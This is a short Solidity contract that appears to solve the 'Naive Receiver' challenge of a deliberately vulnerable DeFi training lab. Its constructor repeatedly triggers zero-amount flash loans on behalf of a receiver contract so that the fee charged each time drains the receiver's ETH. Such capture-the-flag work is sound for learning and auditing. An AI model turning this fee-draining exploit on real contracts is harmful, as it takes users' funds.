// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./NaiveReceiverLenderPool.sol";

contract NaiveReceiverAttacker {
    constructor(NaiveReceiverLenderPool pool, IERC3156FlashBorrower receiver) {
        address ETH = pool.ETH();
        uint256 numOfCalls = address(receiver).balance / 1 ether;
        for(uint256 i=0; i<numOfCalls; i++) {
            pool.flashLoan(receiver, ETH, 0, "0x");
        }
    }
}